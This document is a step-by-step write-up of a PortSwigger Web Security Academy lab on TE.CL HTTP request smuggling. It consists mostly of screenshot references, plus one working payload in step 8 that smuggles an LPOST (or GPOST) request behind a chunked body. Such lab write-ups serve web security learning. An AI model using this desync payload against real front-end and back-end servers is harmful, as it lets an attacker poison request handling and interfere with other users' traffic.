# HTTP request smuggling, basic TE.CL vulnerability

## This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.

## To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST`.

### TE.CL: the front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header.

---

### step 1

![screenshot](images/images_lab2/lab2_homepage_get_request.jpg)

### step2

change request method from get to post

![screenshot](images/images_lab2/lab2_homepage_post_request.jpg)

### step3

make sure to untick update content-length otherwise it will update automatically

![screenshot](images/images_lab2/lab2_testing_content_type.jpg)

### step4

![screenshot](images/images_lab2/lab2_x_equal_g_g0post.jpg)

### step5

![screenshot](images/images_lab2/lab2_hexadecimal_value_a.jpg)

### step6

![screenshot](images/images_lab2/lab2_content_length.jpg)

### step7

![screenshot](images/images_lab2/lab2_content_length_greater_than_a.jpg)

### step8

payload

```
9d
LPOST / HTTP/1.1
Host: 0af5000b0398135283c14c05001f0024.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

### Note : you can directly use GPOST in place of LPOST

![screenshot](images/images_lab2/lab2_payload_testing.jpg)

### step9

![screenshot](images/images_lab2/lab2_r_n_contentent_length.jpg)

---

### step 10

![screenshot](images/images_lab2/lab2_content_length_15.jpg)

---

### step 11

![screenshot](images/images_lab2/lab2_hexadecimal_vlaue_on_another_request.jpg)

---

### step 12

change LPOST to GPOST

![screenshot](images/images_lab2/lab2_final_payload_gpost_to_solve_lab.jpg)

![screenshot](./images/images_lab2/portswigger_wsa/P03_advanced_topics/P21_HTTP request smuggling/labs/images/images_lab2/lab2_solved_lab.jpg)

we can remove unnecessary lines from repeter

---

### step 12(another way)

![screenshot](images/images_lab2/lab2_gpost.jpg)
